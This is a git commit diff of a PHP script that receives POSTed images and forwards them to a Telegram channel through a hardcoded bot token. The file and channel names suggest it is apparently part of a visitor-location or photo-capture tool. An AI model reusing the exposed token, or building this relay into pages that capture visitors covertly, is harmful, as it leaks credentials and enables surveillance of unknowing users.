4b1d0746f13a783901caef49c56cf3748e5f9e4e
Gomaa <137703660+mhfng@users.noreply.github.com>
2023-06-27 21:51:01 +0300

    Update save_location.php

--- save_location.php
+++ save_location.php
@@ -1,27 +1,35 @@
 <?php
-		// Set up the Telegram bot API credentials
-		$bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
-		$telegram_api_url = 'https://api.telegram.org/bot' . $bot_token . '/sendPhoto';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $imageData = $_POST['image'];
 
-		// Check if a photo was sent via POST
-		if(isset($_POST['photo'])) {
-			$photo = $_POST['photo'];
-			// Send the photo to the Telegram channel
-			$post_fields = array(
-				'chat_id' => '@localipy',
-				'photo' => $photo
-			);
-			$ch = curl_init();
-			curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
-			curl_setopt($ch, CURLOPT_POST, true);
-			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
-			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-			$response = curl_exec($ch);
-			curl_close($ch);
-			if($response) {
-				echo '<script>alert("Photo sent to Telegram channel!");</script>';
-			} else {
-				echo '<script>alert("Error sending photo!");</script>';
-			}
-		}
-	?>
+    // Replace with your Telegram bot token
+    $botToken = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+
+    // Replace with your Telegram channel username or ID
+    $channel = '@localipy';
+
+    // Telegram API endpoint
+    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
+
+    // Prepare the request data
+    $postData = array(
+        'chat_id' => $channel,
+        'photo' => $imageData
+    );
+
+    // Send the request to the Telegram Bot API
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    // Process the response if needed
+    $responseData = json_decode($response, true);
+    if ($responseData['ok']) {
+        echo json_encode(array('success' => true));
+    } else {
+        echo json_encode(array('success' => false, 'error' => 'Failed to send image to Telegram.'));
+    }
+}
